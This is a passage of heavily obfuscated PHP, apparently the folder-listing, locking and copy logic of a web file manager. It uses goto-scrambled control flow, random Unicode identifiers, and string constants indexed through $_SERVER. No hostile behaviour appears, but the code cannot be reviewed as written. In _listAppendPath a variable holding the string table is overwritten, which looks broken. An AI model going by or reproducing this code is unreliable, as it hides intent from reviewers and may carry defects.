goto A; A: } protected function _listDataApplyItem($Aĭ, $e⯷ǫ = false) { $fϴ = array($Aĭ); $this->_listDataApply($fϴ, $e⯷ǫ); return $fϴ[0]; } protected function _listDataApply(&$Fؕᐸ, $Eߊ = false) { goto e򝭕; e٠: $Aˏ = array_unique($Aˏ); $this->_listSourceCache($Fؕᐸ); if (!$Eߊ) { $this->_listAppendMeta($Fؕᐸ, $Aˏ); $this->_listAppendFileMeta($Fؕᐸ, $Aˏ); $this->_listAppendChildren($Fؕᐸ, $Aˏ); } goto Bǚ׈; e򝭕: $e렑 =& $_SERVER[ԥ]; if (!$Fؕᐸ) { $Fؕᐸ = array(); return; } $Aˏ = array_to_keyvalue($Fؕᐸ, $e렑[33], $e렑[365]); goto e٠; Bǚ׈: $this->_listAppendPath($Fؕᐸ); $this->_listAppendAuth($Fؕᐸ); $this->_listAppendSourceInfo($Fؕᐸ, $Aˏ); goto Eِ; Eِ: $this->_listAppendUser($Fؕᐸ); $this->_listFilterInfo($Fؕᐸ, $Eߊ); goto f; f: } protected function _listSourceCache($D) { $fڌ =& $_SERVER[ԥ]; foreach ($D as $d⹮) { self::$cacheSourceInfo[$fڌ[406] . $d⹮[$fڌ[365]]] = $d⹮; } } protected function _listFilterInfo(&$E, $B = false) { $DŐ =& $_SERVER[ԥ]; foreach ($E as &$bڡ) { $bڡ = $this->pathInfoFilter($bڡ); self::$cachePathInfo[$DŐ[407] . intval($B) . $DŐ[408] . $bڡ[$DŐ[365]]] = $bڡ; } } protected function _listMake(&$A) { $Cˋ =& $_SERVER[ԥ]; $A[$Cˋ[74]] = array(); $A[$Cˋ[73]] = array(); foreach ($A[$Cˋ[350]] as $e糂ƍ) { $C¾ = $e糂ƍ[$Cˋ[366]] == 1 ? $Cˋ[74] : $Cˋ[73]; $A[$C¾][] = $e糂ƍ; } unset($A[$Cˋ[350]]); } protected function _listAppendMeta(&$EΎ, $E˂) { goto B; B: $F =& $_SERVER[ԥ]; $e = array($F[379] => array($F[380], $E˂)); $cᩊ = Model($F[409])->field($F[410])->where($e)->select(); goto F; F: if (!$cᩊ) { return; } $Dؖ = array($F[411], $F[412]); $AԊ񤠢 = array(); goto BԐƉ; BԐƉ: foreach ($cᩊ as $EƔͦ) { if (!isset($AԊ񤠢[$EƔͦ[$F[365]]])) { $AԊ񤠢[$EƔͦ[$F[365]]] = array(); } if (in_array($EƔͦ[$F[89]], $Dؖ)) { continue; } $AԊ񤠢[$EƔͦ[$F[365]]][$EƔͦ[$F[89]]] = $EƔͦ[$F[355]]; } foreach ($EΎ as &$Eæ) { $Eæ[$F[413]] = !1; if (isset($AԊ񤠢[$Eæ[$F[365]]])) { $Eæ[$F[413]] = $AԊ񤠢[$Eæ[$F[365]]]; } if ($this->fileIsLock($Eæ) && $Eæ[$F[372]]) { $aڦ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Eæ[$F[372]][$F[373]] = AuthModel::authDisable($Eæ[$F[372]][$F[373]], $aڦ); $Eæ[$F[372]][$F[414]][$F[372]] = $Eæ[$F[372]][$F[373]]; } } goto eʜ; eʜ: } protected function _listAppendFileMeta(&$c, $b䝤݆) { goto A˙; A˙: $f =& $_SERVER[ԥ]; $d = array_to_keyvalue($c, $f[33], $f[415]); $d = array_filter(array_unique($d)); goto fşʄ; D: $A뷸 = $A뷸 ? $A뷸 : array(); $d먨 = array(); foreach ($A뷸 as $ḟ) { if (!isset($d먨[$ḟ[$f[415]]])) { $d먨[$ḟ[$f[415]]] = array(); } $d먨[$ḟ[$f[415]]][$ḟ[$f[89]]] = $ḟ[$f[355]]; } goto E; E: foreach ($c as &$fͱ) { goto bɝѠ; cݓ: if (isset($fͱ[$f[158]][$f[422]])) { $fͱ[$f[422]] = json_decode($fͱ[$f[158]][$f[422]], !0); unset($fͱ[$f[158]][$f[422]]); } goto bô; e: $F[$f[77]] = $fͱ[$f[77]]; $F[$f[28]] = $fͱ[$f[28]]; self::$cacheFileInfo[$f[421] . $eԦߪϏ] = $F; goto aĊ; bɝѠ: $eԦߪϏ = $fͱ[$f[415]]; if (!$eԦߪϏ || !isset($b[$eԦߪϏ])) { continue; } $F = $b[$eԦߪϏ]; goto e; aĊ: unset($b[$eԦߪϏ][$f[75]]); $a = is_array($d먨[$eԦߪϏ]) ? $d먨[$eԦߪϏ] : array(); $fͱ[$f[158]] = array_merge($a, $b[$eԦߪϏ]); goto cݓ; bô: } goto C; fşʄ: if (!$d) { return; } $Bš = array($f[416] => array($f[380], $d)); $eǓپ = $f[417]; goto A; A: $b = Model($f[418])->field($eǓپ)->where($Bš)->select(); $b = array_to_keyvalue($b, $f[415]); $A뷸 = Model($f[419])->field($f[420])->where($Bš)->select(); goto D; C: } protected function _listAppendSourceInfo(&$C׻, $aѵϩ) { goto fσʴ; Fȱ: $e = array_to_keyvalue_group($dΞ脠, $aղߦ[365]); foreach ($C׻ as &$b) { $b[$aղߦ[387]] = array($aղߦ[426] => 0, $aղߦ[427] => 0, $aղߦ[428] => 0); if (isset($f[$b[$aղߦ[365]]])) { $b[$aղߦ[387]][$aղߦ[429]] = 1; $b[$aղߦ[387]][$aղߦ[430]] = $f[$b[$aղߦ[365]]][$aղߦ[28]]; } if (isset($A[$b[$aղߦ[365]]])) { $b[$aղߦ[387]][$aղߦ[431]] = array(); foreach ($A[$b[$aղߦ[365]]] as $a؂鮛) { $e = $B[$a؂鮛]; $b[$aղߦ[387]][$aղߦ[431]][] = array($aղߦ[432] => $e[$aղߦ[363]], $aղߦ[382] => $e[$aղߦ[28]], $aղߦ[433] => $e[$aղߦ[434]]); } } if (isset($e[$b[$aղߦ[365]]])) { $b[$aղߦ[387]][$aղߦ[435]] = array(); foreach ($e[$b[$aղߦ[365]]] as $fѓ픞) { $b[$aղߦ[387]][$aղߦ[435]] = array($aղߦ[436] => $fѓ픞[$aղߦ[437]], $aղߦ[438] => $fѓ픞[$aղߦ[439]], $aղߦ[440] => $fѓ픞[$aղߦ[365]], $aղߦ[441] => $fѓ픞[$aղߦ[442]], $aղߦ[443] => $fѓ픞[$aղߦ[444]]); } } } return $C׻; goto Cґú; B: $B = array_to_keyvalue($cҴꌙ, $aղߦ[363]); $A = array_to_keyvalue_group($bȺ´, $aղߦ[75], $aղߦ[389]); $f = array_to_keyvalue($B, $aղߦ[75]); goto Fȱ; Cߖ搌: $bȺ´ = Model($aղߦ[388])->listData(); $B = Model($aղߦ[377])->listData(); $dΞ脠 = Model($aղߦ[425])->listSimple(); goto B; fσʴ: $aղߦ =& $_SERVER[ԥ]; if (!defined($aղߦ[423])) { return; } $cҴꌙ = Model($aղߦ[424])->listData(); goto Cߖ搌; Cґú: } protected function _listAppendChildren(&$aȱדҫ, $fϫ싎) { goto Bʬϋ; Bʬϋ: $D =& $_SERVER[ԥ]; $Aݬ = $D[357]; $Bٸφ = array(); goto a岮; Eګ: $Dڻٯ = $this->tablePrefix . $this->tableName; for ($e壽 = 0; $e壽 < $b֋ڊ; $e壽++) { $d׈ = intval($aȱדҫ[$e壽][$D[393]]); if ($aȱדҫ[$e壽][$D[366]]) { $Fꪨ = $aȱדҫ[$e壽][$D[365]]; $Aݬ .= "\x53\105\x4c\x45\x43\x54\x20\x2a\x20\x46\122\x4f\x4d\x20\x28\x53\x45\114\x45\103\124\40\47{$Fꪨ}\x5f\x68\141\163\x46\x69\x6c\145\47\x20\x61\163\x20\150\x61\163\x2c\143\157\x75\156\164\x28\61\x29\40\141\x73\40\x68\x61\x73\x43\157\x75\x6e\164\40\x46\x52\x4f\x4d\x20\x60{$Dڻٯ}\140\40\xa\11\11\11\11\11\167\150\145\162\145\40\x70\x61\x72\x65\156\164\x49\x44\x3d{$Fꪨ}\40\x61\x6e\x64\x20\x69\163\x46\157\154\x64\145\162\x3d\60\x20\141\156\x64\x20\151\x73\104\145\x6c\145\164\145\x3d{$d׈}\51\40\x61\x73\40\164\x62\x31\x5f{$Fꪨ}\40\x75\156\x69\x6f\156\x20\141\x6c\x6c\x20\12\11\x9\11\11\11\123\105\x4c\105\x43\124\x20\52\40\x46\x52\x4f\115\40\x28\x53\x45\114\x45\x43\x54\x20\47{$Fꪨ}\137\x68\x61\163\x46\x6f\154\144\x65\x72\47\x20\141\163\40\150\x61\x73\x46\x69\x6c\x65\x2c\x63\157\165\x6e\x74\x28\x31\x29\40\x61\163\40\x68\141\163\x43\x6f\x75\x6e\164\x20\x46\122\117\x4d\x20\x60{$Dڻٯ}\140\40\xa\x9\x9\x9\11\x9\167\x68\x65\162\145\40\x70\141\162\x65\156\x74\x49\104\x3d{$Fꪨ}\40\x61\156\x64\x20\x69\163\x46\x6f\x6c\144\145\162\x3d\x31\x20\141\156\x64\x20\x69\x73\x44\145\154\145\x74\x65\75{$d׈}\x29\40\x61\x73\x20\x74\x62\x32\x5f{$Fꪨ}\40\x75\x6e\151\x6f\x6e\40\141\154\x6c\40"; } if ((strlen($Aݬ) >= $cͲƦ || $e壽 == $b֋ڊ - 1) && $Aݬ) { $Aݬ = substr($Aݬ, 0, -strlen($D[445])); $d㰘 = $this->query($Aݬ); $Bٸφ = array_merge($Bٸφ, $d㰘); $Aݬ = $D[33]; } } $Bٸφ = array_to_keyvalue($Bٸφ, $D[446]); goto B; a岮: $cͲƦ = 1024 * 50; $aȱדҫ = is_array($aȱדҫ) ? $aȱדҫ : array(); $b֋ڊ = count($aȱדҫ); goto Eګ; B: foreach ($aȱדҫ as &$dЯԈ) { if ($dЯԈ[$D[366]]) { unset($dЯԈ[$D[368]]); $dЯԈ[$D[188]] = intval($Bٸφ[$dЯԈ[$D[365]] . $D[447]][$D[448]]); $dЯԈ[$D[187]] = intval($Bٸφ[$dЯԈ[$D[365]] . $D[449]][$D[448]]); } } goto b; b: } protected function _listAppendAuth(&$e) { goto aʋ; B܄: $AƿЏ = Model($fӦ[450])->getSourceList($Eӧ, $Bʴ); foreach ($e as $E磏 => &$fɶ) { $fɶ[$fӦ[372]] = $AƿЏ[$fɶ[$fӦ[365]]]; if (!$fɶ[$fӦ[372]] && $fɶ[$fӦ[367]] == self::TYPE_GROUP) { $fɶ[$fӦ[372]] = Action($fӦ[451])->pathGroupAuthMake($fɶ[$fӦ[452]]); if (!$fɶ[$fӦ[372]] && !_get($GLOBALS, $fӦ[453])) { $fɶ[$fӦ[185]] = !1; $fɶ[$fӦ[184]] = !1; } } if ($fɶ[$fӦ[372]]) { $fɶ[$fӦ[185]] = AuthModel::authCheckEdit($fɶ[$fӦ[372]][$fӦ[373]]); $fɶ[$fӦ[184]] = AuthModel::authCheckView($fɶ[$fӦ[372]][$fӦ[373]]); } $this->groupPathDisplay($fɶ); } goto aȏ; aʋ: $fӦ =& $_SERVER[ԥ]; if (!defined($fӦ[423])) { return; } $Eӧ = array(); goto A퐩; A퐩: foreach ($e as $fɶ) { if ($fɶ[$fӦ[367]] == self::TYPE_GROUP) { $Eӧ[] = $fɶ[$fӦ[365]]; } } if (!$Eӧ) { return; } $Bʴ = array_to_keyvalue($e, $fӦ[365]); goto B܄; aȏ: } public function groupPathDisplay(&$d) { goto EΊ; DԮ: $d[$AÏɪ[456]] = $d򞡮[$AÏɪ[457]]; $d[$AÏɪ[376]] = $d򞡮[$AÏɪ[455]]; $d[$AÏɪ[458]] = $d򞡮[$AÏɪ[459]]; goto Dǧ; cʏƉ: $Aŕ = $this->parentLevelArray($d򞡮[$AÏɪ[455]]); $Dð = $AÏɪ[33]; foreach ($Aŕ as $AŅߖ) { $Fň = Model($AÏɪ[454])->getInfo($AŅߖ); $Dð .= $Fň[$AÏɪ[387]][$AÏɪ[365]] . $AÏɪ[47]; } goto DԮ; Dǧ: $d[$AÏɪ[460]] = $Dð . $d򞡮[$AÏɪ[387]][$AÏɪ[365]]; goto aӚ; EΊ: $AÏɪ =& $_SERVER[ԥ]; if ($d[$AÏɪ[367]] != self::TYPE_GROUP) { return; } $d򞡮 = Model($AÏɪ[454])->getInfo($d[$AÏɪ[452]]); goto cʏƉ; aӚ: } protected function _listAppendPath(&$eֳ) { goto Cڛк; aÏ: $b󟛆 = array(); foreach ($f as $D؋ => $f͋) { if (!$f͋) { $b󟛆[] = $D؋; } } if ($b󟛆) { $aۉ = array($a[379] => array($a[380], $b󟛆)); if (count($b󟛆) == 1) { $F湵 = $this->sourceInfo($b󟛆[0]); $F湵 = is_array($F湵) ? array($F湵) : !1; } else { $F湵 = $this->field($a[461])->where($aۉ)->select(); } $C˽ = array_to_keyvalue($F湵, $a[365], $a[28]); $f = array_merge_index($f, $C˽); } goto Eê; Cڛк: $a =& $_SERVER[ԥ]; $f = array(); foreach ($eֳ as &$F) { $f[$F[$a[365]]] = $F[$a[28]]; $a = $this->parentLevelArray($F[$a[455]]); array_shift($a); foreach ($a as $BǈŻ) { if (!isset($f[$BǈŻ])) { $f[$BǈŻ] = 0; } } } goto aÏ; Eê: $C輻 = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($eֳ as &$F) { goto DǑ՘; DǑ՘: $a = $this->parentLevelArray($F[$a[455]]); $C¦ = $this->_listAppendPathRoot($F, $a); foreach ($a as $BǈŻ) { if (isset($f[$BǈŻ])) { $C¦ .= $f[$BǈŻ] . $a[8]; } } goto EԊ; EԊ: if ($a) { $C¦ .= $F[$a[28]]; } if ($F[$a[366]]) { $C¦ .= $a[8]; } $F[$a[462]] = str_replace($a[463], $a[8], $C¦); goto E󉌦; E󉌦: $E = trim($F[$a[462]], $a[8]); if ($F[$a[457]] == $a[464] && $E) { $F[$a[28]] = $E; } $this->_listAppendPathRecycle($F, $a, $C輻); goto a󫍯ת; a󫍯ת: } goto A򚆥; A򚆥: } private function _listAppendPathRecycle(&$aӳԽ, $c, $A) { goto eȃ; eȃ: $F󑄚 =& $_SERVER[ԥ]; if (intval($aӳԽ[$F󑄚[367]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($A, $c) && $aӳԽ[$F󑄚[365]] != $A) { return; } goto Cϫ; Cϫ: $Dꖭ = explode($F󑄚[8], trim($aӳԽ[$F󑄚[462]], $F󑄚[8])); $C赌 = implode($F󑄚[8], array_slice($Dꖭ, 2)); $aӳԽ[$F󑄚[462]] = $F󑄚[8] . LNG($F󑄚[465]) . $F󑄚[8] . ltrim($C赌, $F󑄚[8]); goto dÌá; dÌá: $aӳԽ[$F󑄚[455]] = $F󑄚[466] . implode($F󑄚[47], array_slice($c, 1)) . $F󑄚[47]; if ($aӳԽ[$F󑄚[365]] == $A) { $aӳԽ[$F󑄚[455]] = $F󑄚[466]; $aӳԽ[$F󑄚[457]] = $F󑄚[464]; $aӳԽ[$F󑄚[28]] = LNG($F󑄚[465]); } $aӳԽ[$F󑄚[467]] = $F󑄚[468]; goto d¯۟ٺ; d¯۟ٺ: } protected function _listAppendPathRoot(&$c, $Eؽ) { $C =& $_SERVER[ԥ]; $A = $C[33]; if ($c[$C[367]] == self::TYPE_USER) { if (defined($C[423]) && $c[$C[452]] == USER_ID) { $A = LNG($C[469]); if (!$Eؽ) { $c[$C[28]] = $A; } } else { $fů = Model($C[470])->getInfoSimple($c[$C[452]]); $A = LNG($C[471]) . $C[153] . $fů[$C[28]] . $C[472]; } } else { if ($c[$C[367]] == self::TYPE_GROUP) { $fů = Model($C[454])->getInfoSimple($c[$C[452]]); $A = $fů[$C[28]]; } else { if ($c[$C[367]] == self::TYPE_SYSTEM) { $fů = $this->sourceInfo($Eؽ[0], !0); $A = $fů[$C[28]]; } } } $A = $A ? $C[8] . $A . $C[8] : $C[8]; return $A; } protected function _listAppendUser(&$eʊ탽) { $a˟ =& $_SERVER[ԥ]; $cܹ = array_to_keyvalue($eʊ탽, $a˟[33], $a˟[374]); $B = array_to_keyvalue($eʊ탽, $a˟[33], $a˟[375]); $eą = array_merge($cܹ, $B); $AЈ = Model($a˟[473])->userListInfo($eą); foreach ($eʊ탽 as &$fꦔ) { $FĚ⃉ = $fꦔ[$a˟[374]]; $fꦔ[$a˟[374]] = $AЈ[$FĚ⃉] ? $AЈ[$FĚ⃉] : !1; $FĚ⃉ = $fꦔ[$a˟[375]]; $fꦔ[$a˟[375]] = $AЈ[$FĚ⃉] ? $AЈ[$FĚ⃉] : !1; if (isset($fꦔ[$a˟[413]]) && $fꦔ[$a˟[413]][$a˟[474]]) { $Bَ = $GLOBALS[$a˟[6]][$a˟[84]][$a˟[475]]; if ($fꦔ[$a˟[413]][$a˟[476]] <= time() - $Bَ) { $this->metaSet($fꦔ[$a˟[365]], $a˟[474], null); $this->metaSet($fꦔ[$a˟[365]], $a˟[476], null); unset($fꦔ[$a˟[413]][$a˟[474]]); continue; } $C = $fꦔ[$a˟[413]][$a˟[474]]; $fꦔ[$a˟[413]][$a˟[477]] = Model($a˟[473])->getInfoSimpleOuter($C); } } } public function parentLevelArray($Dγֽ) { $C߾ =& $_SERVER[ԥ]; $Dγֽ = explode($C߾[47], trim($Dγֽ, $C߾[47])); return array_remove_value($Dγֽ, $C߾[464]); } public function listAll($Eى) { goto CϾ; CϾ: $də =& $_SERVER[ԥ]; $cࣅ = $this->sourceInfo($Eى); $Cഠ = array($də[478] => array($də[479], $cࣅ[$də[455]] . $Eى . $də[480]), $də[481] => 0); goto DҲ; d﬇: $this->_listAppendAuth($Bɹ׿); $this->_listAppendUser($Bɹ׿); $this->_listAppendPath($Bɹ׿); goto e; e: $Bɹ׿ = array_to_keyvalue($Bɹ׿, $də[365]); $aɾϔ = "\x2f{$cࣅ[$də[28]]}\57"; $aɾϔ = $aɾϔ == $də[463] ? $də[8] : $aɾϔ; goto eϯ; DҲ: $Cʅ = $də[482]; $fވ = "\x4c\105\106\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\146\x69\154\x65\x20\x66\151\x6c\x65\x20\x6f\156\40\x73\x6f\x75\162\x63\145\x2e\x66\151\x6c\145\x49\104\x20\75\40\x66\x69\x6c\145\x2e\x66\x69\154\x65\x49\104"; $Bɹ׿ = $this->alias($də[483])->field($Cʅ)->where($Cഠ)->join($fވ)->select(); goto d﬇; eϯ: $F۩ئ = array(); foreach ($Bɹ׿ as $f => $B) { goto cĚ; cĚ: $fЛ = $this->parentLevelArray($B[$də[455]]); array_shift($fЛ); $e̪ = $aɾϔ; goto A; A: for ($BՑ = 0; $BՑ < count($fЛ); $BՑ++) { $e̪ .= $Bɹ׿[$fЛ[$BՑ]][$də[28]] . $də[8]; } $e̪ .= $B[$də[28]]; if ($B[$də[366]]) { $e̪ .= $də[8]; } goto EԢ; C̕: if (!$B[$də[366]]) { $F䐹[$də[415]] = $B[$də[415]]; $F䐹[$də[485]] = $B[$də[75]]; } $F۩ئ[] = $F䐹; goto Fʛ; EԢ: $e̪ = str_replace($də[463], $də[8], $e̪); $e̪ = str_replace($də[463], $də[8], $e̪); $F䐹 = array($də[383] => str_replace($də[463], $də[8], $e̪), $də[484] => intval($B[$də[366]]), $də[387] => $this->pathInfoFilter($B, !0)); goto C̕; Fʛ: } return $F۩ئ; goto B; B: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($B٦) { goto Eտԙ; Eտԙ: $Aʍ =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aʍ[486], $B٦); goto a隽ɏ; a隽ɏ: $e϶§ = 1; $this->_lockEvent($B٦, array($Aʍ[487], $Aʍ[488]), $e϶§); $this->_lockParent($B٦, array($Aʍ[488]), $e϶§); goto bˉ; bˉ: $this->_lockEvent($B٦, array($Aʍ[489], $Aʍ[490]), $e϶§); $this->_lockCheckEnd($Aʍ[486], $B٦); goto BБؘ; BБؘ: } public function lockCopyEnd($C) { $b =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $a = 0; $this->_lockEvent($C, array($b[487], $b[488]), $a); $this->_lockParent($C, array($b[488]), $a); $this->_lockEvent($C, array($b[489], $b[490]), $a); } public function lockWriteStart($aκ, $AփϘ = '') { goto c; CГע: $fŌ = 1; $this->_lockKey($Eߥ[491] . $aκ . $Eߥ[91] . $AփϘ, $fŌ); $this->_lockEvent($aκ, array($Eߥ[486], $Eߥ[488]), $fŌ); goto cŰﰡ; cŰﰡ: $this->_lockParent($aκ, array($Eߥ[486], $Eߥ[488]), $fŌ); $this->_lockCheckEnd($Eߥ[487], $aκ); goto B; c: $Eߥ =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eߥ[487], $aκ); goto CГע; B: } public function lockWriteEnd($c⼡ܹ, $A嫏 = '') { $eŋ =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $fח = 0; $this->_lockKey($eŋ[491] . $c⼡ܹ . $eŋ[91] . $A嫏, $fח); $this->_lockEvent($c⼡ܹ, array($eŋ[486], $eŋ[488]), $fח); $this->_lockParent($c⼡ܹ, array($eŋ[486], $eŋ[488]), $fח); } public function lockMoveStart($Eף) { goto e໅; Cގٔ: $EĐ = 1; $this->_lockKey($b᭘[492] . $Eף, $EĐ); $this->_lockEvent($Eף, array($b᭘[486], $b᭘[487]), $EĐ); goto E䱄Ɛ; E䱄Ɛ: $this->_lockParent($Eף, array($b᭘[486], $b᭘[488]), $EĐ); $this->_lockEvent($Eף, array($b᭘[493], $b᭘[489], $b᭘[490]), $EĐ); $this->_lockCheckEnd($b᭘[488], $Eף); goto Bϐ; e໅: $b᭘ =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $this->_lockCheck($b᭘[488], $Eף); goto Cގٔ; Bϐ: } public function lockMoveEnd($e䵕) { goto f⊫; C򨎱: $this->_lockEvent($e䵕, array($fׂ[493], $fׂ[489], $fׂ[490]), $b袅); goto eס; f⊫: $fׂ =& $_SERVER[ԥ]; if (!$this->allowLock()) { return; } $b袅 = 0; goto D͙˰; D͙˰: $this->_lockKey($fׂ[492] . $e䵕, $b袅); $this->_lockEvent($e䵕, array($fׂ[486], $fׂ[487]), $b袅); $this->_lockParent($e䵕, array($fׂ[486], $fׂ[488]), $b袅); goto C򨎱; eס: } private function _lockCheck($ař, $c) { goto F; c: $this->_lockTimeStart[$Eω] = timeFloat(); if (!is_array($A)) { return; } $cᮯԹ = LNG($BЫ[494]); goto BݽӞ; fۚ: $BרĎ = array_reverse($this->parentLevelArray($A[$BЫ[455]])); foreach ($BרĎ as $Cцب) { $Eω = $ař . $BЫ[495] . $Cцب; if (CacheLock::lockGet($BЫ[496] . $Eω)) { $A = $this->sourceInfo($Cцب); CacheLock::setErrorMsg($BЫ[153] . htmlspecialchars($A[$BЫ[28]]) . $BЫ[472] . $cᮯԹ); $this->_lockKey($Eω, 1); $this->_lockKey($Eω, 0); } } goto C; F: $BЫ =& $_SERVER[ԥ]; $A = $this->sourceInfo($c); $Eω = $ař . $BЫ[91] . $c; goto c; BݽӞ: CacheLock::setErrorMsg($BЫ[153] . htmlspecialchars($A[$BЫ[28]]) . $BЫ[472] . $cᮯԹ); $this->_lockKey($Eω, 1); $this->_lockKey($Eω, 0); goto fۚ; C: } private function _lockCheckEnd($Aʏ, $e) { goto dќ; Bͬ案: if (!isset($this->_lockTimeStart[$eۻ])) { return; } $c꼽 = timeFloat() - $this->_lockTimeStart[$eۻ]; unset($this->_lockTimeStart[$eۻ]); goto Cੌ; Cੌ: if ($c꼽 > 0.5) { unset(self::$cacheSourceInfo[$Aԉ[406] . $e]); } $d = $this->sourceInfo($e); if (!$d) { show_json(LNG($Aԉ[100]), !1); } goto eȜ; dќ: $Aԉ =& $_SERVER[ԥ]; $eۻ = $Aʏ . $Aԉ[91] . $e; CacheLock::setErrorMsg($Aԉ[357]); goto Bͬ案; eȜ: } private function _lockParent($d£, $cѮ, $A) { if (!$this->autoLockSet) { return; } $eڽ = $this->sourceInfo($d£); if (!is_array($eڽ)) { return; } $c飆ڃ = array_reverse($this->parentLevelArray($eڽ[$_SERVER[ԥ][455]])); foreach ($c飆ڃ as $a˝) { $this->_lockEvent($a˝, $cѮ, $A); } } private function _lockEvent($aȳ, $EȲ, $a) { $Dǿ =& $_SERVER[ԥ]; if (!$this->autoLockSet) { return; } foreach ($EȲ as $f) { $Eȇτ = $f . $Dǿ[91] . $aȳ; if ($a && CacheLock::lockGet($Dǿ[496] . $Eȇτ)) { continue; } $this->_lockKey($Eȇτ, $a); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($f, $cϠ = 1) { $bʠ = $_SERVER[ԥ][496] . md5($f); if ($cϠ) { if (isset(self::$_lockItemArr[$bʠ])) { return; } self::$_lockItemArr[$bʠ] = 1; CacheLock::lock($bʠ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$bʠ])) { return; } unset(self::$_lockItemArr[$bʠ]); CacheLock::unlock($bʠ); } } public function isParentOf($Eܪ϶, $f) { goto A¥; f鄂Ʈ: $E = $B[$fۧ[455]] . $B[$fۧ[365]] . $fۧ[47]; $dڏ = $C߉[$fۧ[455]] . $C߉[$fۧ[365]] . $fۧ[47]; $C = strpos($dڏ, $E) === 0; goto Bԓ; A¥: $fۧ =& $_SERVER[ԥ]; $B = $this->sourceInfo($Eܪ϶); $C߉ = $this->sourceInfo($f); goto f鄂Ʈ; Bԓ: return $C; goto Eкԋ; Eкԋ: } private $targetIsDelete = 0; public function copy($b, $fю㚻, $eè = REPEAT_REPLACE, $fͺա = '') { goto F鿩; DТ: $this->saveAll($cе[$fȕ[499]]); Model($fȕ[163])->linkAdd($cе[$fȕ[497]]); $this->folderSizeReset($fю㚻); goto aęО; aęО: $this->updateModifyTime($fю㚻); return $f; goto a; F鿩: $fȕ =& $_SERVER[ԥ]; $cϳՓ = $this->sourceInfo($b); $eщ = $this->sourceInfo($fю㚻); goto Dղ; C: $this->lockCopyStart($b); $this->lockWriteStart($fю㚻, $eь); $cе = array($fȕ[497] => array(), $fȕ[498] => array(), $fȕ[499] => array()); goto fݣ; Dղ: if (!$cϳՓ || !$eщ || $eщ[$fȕ[366]] != $fȕ[83]) { return !1; } if ($this->isParentOf($b, $fю㚻)) { return !1; } $eь = $fͺա ? $fͺա : $cϳՓ[$fȕ[28]]; goto C; fݣ: $this->targetIsDelete = intval($cϳՓ[$fȕ[393]]); $a᳆Ց = $this->fileNameExistCache($fю㚻, $cϳՓ[$fȕ[28]]); $f = $this->_copy($b, $fю㚻, $eè, $cе, !0, $fͺա); goto Aǰ; Aǰ: $this->_childrenListClear(); $this->lockCopyEnd($b); $this->lockWriteEnd($fю㚻, $eь); goto e; e: if ($cϳՓ[$fȕ[366]] == $fȕ[83] && $a᳆Ց == $f) { $this->folderSizeResetChildren($a᳆Ց); } Model($fȕ[500])->addAll($cе[$fȕ[498]], array(), !0); if ($a᳆Ց != $f || $cϳՓ[$fȕ[366]] == $fȕ[83]) { Model($fȕ[501])->eventCopy($f); } goto DТ; a: } private function _copy($b͍࿅, $dĩ, $b࢈Ո, &$Fч҅, $c܍, $aЇ = '') { goto d; a: return $d襏; goto DУړ; d: $B =& $_SERVER[ԥ]; $Fʌ = $this->sourceInfoCache($b͍࿅); $bύ = $Fʌ[$B[366]] == $B[83]; goto eثË; eثË: $e = $aЇ ? $aЇ : $Fʌ[$B[28]]; $CѸ = $this->fileNameExistCache($dĩ, $e); if ($c܍) { $this->_childrenAllMake($b͍࿅); if ($bύ && $CѸ) { $this->_childrenAllMake($CѸ); } } goto fߎ; fߎ: if (!$CѸ) { return $this->_copyCreate($b͍࿅, $dĩ, $e, $Fч҅); } $d襏 = $CѸ; if ($bύ) { if ($b࢈Ո == REPEAT_RENAME_FOLDER) { $e = $this->fileNameAutoCache($dĩ, $e, $b࢈Ո, $bύ); $d襏 = $this->_copyCreate($b͍࿅, $dĩ, $e, $Fч҅); } else { $F؆˘ = $this->_childrenList($b͍࿅); foreach ($F؆˘ as $dڑ) { $this->_copy($dڑ[$B[365]], $CѸ, $b࢈Ո, $Fч҅, !1); } } } else { if ($b࢈Ո == REPEAT_RENAME || $b࢈Ո == REPEAT_RENAME_FOLDER) { $e = $this->fileNameAutoCache($dĩ, $e, $b࢈Ո, $bύ); $d襏 = $this->_copyCreate($b͍࿅, $dĩ, $e, $Fч҅); } else { if ($b࢈Ո == REPEAT_REPLACE) { $f͒ = $this->sourceInfoCache($CѸ); $eݖ = $this->fileHistory($f͒, $Fʌ[$B[415]], $Fʌ[$B[77]]); if ($eݖ) { $Fч҅[$B[497]][] = $Fʌ[$B[415]]; } } else { if ($b࢈Ո == REPEAT_SKIP) { } } } Hook::trigger($B[502], array($B[503], $Fʌ, 0)); } goto a; DУړ: } private function _copyCreate($e̥, $b, $Dϻ, &$aۭ) { goto b٧; D礚: $this->chunkEventSet($b˙[511], array($b˙[512], $B, $eӅ)); $this->saveAll($c); return $C李; goto Dݖߠ; C: $C李 = $this->add($B); $a̾ݗ = array($b˙[365] => $C李, $b˙[28] => $Dϻ); $this->_copyApplyMeta($a̾ݗ, $aۭ); goto D٠; F: $B = $this->_makeItemData($bͅۊ, $Cʱ, $Dϻ); Hook::trigger($b˙[504], $B); Hook::trigger($b˙[505], array($b˙[506], $B, 0)); goto C; D٠: if ($bͅۊ[$b˙[366]] != $b˙[83]) { $aۭ[$b˙[497]][] = $bͅۊ[$b˙[415]]; return $C李; } $d뺍 = array(); $d͈ = array(); goto aظԇƥ; b٧: $b˙ =& $_SERVER[ԥ]; $bͅۊ = $this->sourceInfoCache($e̥); $Cʱ = $this->sourceInfoCache($b); goto F; f: foreach ($c as $aҺ) { $b۝ = $aҺ[$b˙[365]]; $E㏣ = $this->_childrenMatch($EӅ, $aҺ, $f); $Aڋ[] = array($b˙[365], $b۝, $b˙[457], $E㏣[$b˙[457]]); $c[] = array($b˙[365], $b۝, $b˙[455], $E㏣[$b˙[455]]); $this->_copyApplyMeta($aҺ, $aۭ); if 